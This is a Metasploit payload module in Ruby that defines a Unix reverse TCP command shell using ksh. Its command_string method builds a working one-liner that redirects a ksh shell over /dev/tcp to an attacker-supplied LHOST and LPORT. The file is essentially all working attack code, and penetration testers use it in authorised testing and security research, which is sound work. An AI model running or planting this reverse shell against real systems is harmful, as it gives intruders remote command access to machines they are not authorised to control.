##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 52

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Ksh)',
      'Description' => %q{
        Connect back and create a command shell via Ksh.  Note: Although Ksh is often
        available, please be aware it isn't usually installed by default.
      },
      'Author'      => 'Wang Yihang <wangyihanger[at]gmail.com>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'ksh',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    super + command_string
  end

  def command_string
    "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
  end
end
